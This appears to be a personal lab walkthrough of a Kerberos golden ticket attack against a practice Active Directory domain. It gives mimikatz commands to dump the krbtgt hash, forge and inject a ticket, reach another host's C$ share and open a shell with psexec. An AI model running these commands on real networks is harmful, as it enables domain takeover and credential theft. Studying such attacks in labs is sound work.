Download and launch mimikatz on the DC:
![[Pasted image 20240324191521.png]]

Set debug privileges:
![[Pasted image 20240324191604.png]]

WE this command does:
```cmd
lsadump::lsa /inject /name:krbtgt
```

From the output note the domain SID and the NTLM hash:
![[Pasted image 20240324191914.png]]

With these infos we can generate a golden ticket:
```cmd
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-2326780594-1701311207-1489289825 /krbtgt:ff6b7ddd0efba581f52d431bbec9894b /id:500 /ptt
```
Args:
`/User`: Any value here, its not important
`/domain`: The domain
`/sid`: The SID from the output above
`/krbtgt`: The NTLM hash from the output above
`/id`: Admin account ID
`/ptt`: Pass the ticket

This created a new golden ticket for our current session:
![[Pasted image 20240324192625.png]]

Open a new command window with `misc::cmd`:
![[Pasted image 20240324192804.png]]
This opens a cmd prompt with our newly created golden ticket.

With `dir \\THEPUNISHER\c$` we can for example now list the directory on the THEPUNISHER machine:
![[Pasted image 20240324193016.png]]

We could download and run *psexec* against the THEPUNISHER machine to get a local shell:
```cmd
psexec.exe \\THEPUNISHER cmd.exe
```